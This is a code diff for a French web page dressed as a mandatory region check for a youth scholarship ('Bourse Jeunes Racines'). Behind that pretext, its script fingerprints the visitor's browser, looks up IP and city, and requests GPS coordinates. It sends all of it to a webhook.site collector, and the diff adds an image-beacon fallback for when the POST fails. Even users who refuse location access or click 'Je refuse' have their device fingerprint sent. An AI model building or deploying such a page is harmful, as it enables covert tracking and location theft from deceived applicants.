@@ -5,16 +5,14 @@
   <title>Jeunes Racines – Confirmation de région</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    /* ===== Page Layout ===== */
     body {
       margin: 0;
       font-family: Arial, sans-serif;
       background-color: #f7f7f7;
     }
 
-    /* ===== Top Banner Section ===== */
     .banner {
-      background-image: url('https://i.imgur.com/ONf3SmL.png'); /* Background image for header */
+      background-image: url('https://i.imgur.com/ONf3SmL.png');
       background-size: cover;
       background-position: center;
       background-repeat: no-repeat;
@@ -28,13 +26,11 @@
       text-shadow: 1px 1px 3px #000;
     }
 
-    /* Lock icon styling inside the banner */
     .lock-icon {
       font-size: 24px;
-      line-height: 1; /* Vertically aligns it better with the text */
+      line-height: 1;
     }
 
-    /* ===== Main Content Styling ===== */
     .content {
       padding: 30px;
       text-align: center;
@@ -48,7 +44,6 @@
       margin-right: auto;
     }
 
-    /* Main green button */
     button {
       padding: 12px 24px;
       font-size: 16px;
@@ -59,21 +54,18 @@
       cursor: pointer;
     }
 
-    /* Red "Je refuse" button styling */
     .refuse-button {
       background-color: darkred;
       margin-top: 15px;
-      margin-bottom: 25px; /* Adds breathing room below the red button */
+      margin-bottom: 25px;
     }
 
-    /* Paragraph text style */
     p {
       font-size: 16px;
       max-width: 600px;
       margin: 20px auto;
     }
 
-    /* Loading text style (appears during location lookup) */
     .loading {
       display: none;
       margin-top: 15px;
@@ -81,7 +73,6 @@
       color: #333;
     }
 
-    /* Region/IP display text */
     .region {
       font-size: 14px;
       color: #333;
@@ -91,7 +82,7 @@
 </head>
 <body>
 
-  <!-- 🔒 Banner with lock and title using flex layout -->
+  <!-- 🔒 Top banner -->
   <div class="banner">
     <div style="display: flex; align-items: center; gap: 10px;">
       <span class="lock-icon">🔒</span>
@@ -99,11 +90,10 @@
     </div>
   </div>
 
+  <!-- 🌿 Main content -->
   <div class="content">
-    <!-- 🌱 Logo image -->
     <img src="https://i.imgur.com/GpAGxP1.png" alt="Jeunes Racines Logo" class="logo">
 
-    <!-- 📍 Heading and instructions -->
     <h2>Vérification de la Région Grand Est</h2>
     <p>
       Avant de poursuivre votre candidature pour la Bourse Jeunes Racines,
@@ -111,99 +101,102 @@
       Cette vérification est obligatoire.
     </p>
 
-    <!-- 🌍 Shows region/IP info pulled from IP lookup -->
     <div id="ip-region" class="region">📍 Détection de votre région en cours...</div>
 
-    <!-- ✅ GPS location confirm button -->
     <button onclick="getLocation()">Je confirme ma position</button>
-
-    <!-- ❌ Refuse button fallback -->
     <br><br>
     <button class="refuse-button" onclick="refuse()">Je refuse</button>
 
-    <!-- ⏳ Loading text appears during location detection -->
     <div class="loading" id="loading-text">⏳ Vérification en cours... Merci de patienter.</div>
 
-    <!-- ℹ️ Small footer text -->
     <p style="font-size: 13px; color: grey;">
       Cette étape prend environ 15 secondes et améliore la sécurité du formulaire.
     </p>
   </div>
 
-  <!-- 🧠 FINGERPRINT + REGION + LOCATION SCRIPT -->
+  <!-- 🧠 Scripts -->
   <script src="https://openfpcdn.io/fingerprintjs/v3"></script>
   <script>
-    let fingerprintData = {}; // Used to store browser/device info
-    let finalRedirectURL = "https://sites.google.com/view/jeunes-racines/"; // Redirect after success
+    let fingerprintData = {};
+    let finalRedirectURL = "https://sites.google.com/view/jeunes-racines/";
 
-    // 🔍 Load FingerprintJS and collect device/browser info
+    // Load fingerprint and IP data (lightweight only)
     FingerprintJS.load().then(fp => {
       fp.get().then(result => {
-        fingerprintData = {
-          visitorId: result.visitorId,
-          components: result.components,
-          screen: {
-            width: window.screen.width,
-            height: window.screen.height
-          },
-          language: navigator.language,
-          platform: navigator.platform,
-          deviceMemory: navigator.deviceMemory || "unknown",
-          cpuCores: navigator.hardwareConcurrency || "unknown"
-        };
+        fingerprintData.visitorId = result.visitorId;
+        fingerprintData.platform = navigator.platform;
+        fingerprintData.language = navigator.language;
 
-        // 🌍 Fetch IP + ISP + Region info
         fetch('https://ipwho.is/')
-          .then(response => response.json())
+          .then(res => res.json())
           .then(ipInfo => {
             fingerprintData.ipInfo = {
               ip: ipInfo.ip,
-              isp: ipInfo.connection?.isp,
-              org: ipInfo.connection?.org,
-              country: ipInfo.country,
-              city: ipInfo.city,
               region: ipInfo.region,
-              timezone: ipInfo.timezone?.id
+              country: ipInfo.country,
+              city: ipInfo.city
             };
-
-            // Display to user
             document.getElementById('ip-region').textContent = `📍 Région détectée : ${ipInfo.region}, ${ipInfo.country}`;
           });
       });
     });
 
-    // ✅ If user clicks “Je confirme ma position”
+    // 📸 Beacon fallback that sends data using an image (no CORS needed)
+    function beaconLog(data) {
+      const base = "https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b";
+      const params = new URLSearchParams({
+        lat: data.lat || "none",
+        lon: data.lon || "none",
+        acc: data.accuracy || "none",
+        visitorId: fingerprintData.visitorId || "unknown",
+        region: fingerprintData.ipInfo?.region || "unknown",
+        country: fingerprintData.ipInfo?.country || "unknown",
+        city: fingerprintData.ipInfo?.city || "unknown",
+        ref: data.status || "auto"
+      });
+      const img = new Image();
+      img.src = `${base}?${params.toString()}`;
+    }
+
+    // ✅ Called when user confirms their location
     function getLocation() {
       document.getElementById("loading-text").style.display = "block";
 
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
-          // Log successful GPS data
+          const payload = {
+            lat: position.coords.latitude,
+            lon: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            fingerprint: fingerprintData
+          };
+
+          // Attempt POST first
           fetch("https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              lat: position.coords.latitude,
-              lon: position.coords.longitude,
-              accuracy: position.coords.accuracy,
-              fingerprint: fingerprintData
-            })
+            body: JSON.stringify(payload)
+          }).catch(() => {
+            // If fetch fails, use beacon
+            beaconLog(payload);
           });
 
-          // Redirect after short pause
+          // Redirect after short delay
           setTimeout(() => {
             window.location.href = finalRedirectURL;
           }, 1000);
 
-        }, function(error) {
-          // User denied location access
+        }, function() {
+          // If user blocks location access
+          const fallback = { status: "Permission refusée" };
+
+          // Try POST first
           fetch("https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              status: "Permission refusée",
-              fingerprint: fingerprintData
-            })
+            body: JSON.stringify({ ...fallback, fingerprint: fingerprintData })
+          }).catch(() => {
+            beaconLog(fallback); // fallback beacon if fetch fails
           });
 
           alert("Accès refusé. Redirection...");
@@ -215,21 +208,21 @@
       }
     }
 
-    // ❌ Manual “Je refuse” fallback option
+    // ❌ Manual "Je refuse" fallback button
     function refuse() {
+      const fallback = { status: "Refus manuel" };
+
       fetch("https://webhook.site/a9952f5e-df11-4216-83d6-4d906360ee3b", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          status: "Refus manuel",
-          fingerprint: fingerprintData
-        })
+        body: JSON.stringify({ ...fallback, fingerprint: fingerprintData })
+      }).catch(() => {
+        beaconLog(fallback); // fallback beacon
       });
 
       alert("Vous avez refusé. Redirection en cours...");
       window.location.href = "https://sites.google.com/view/jeunes-racines/localisation-non-verifiee";
     }
   </script>
-
 </body>
 </html>
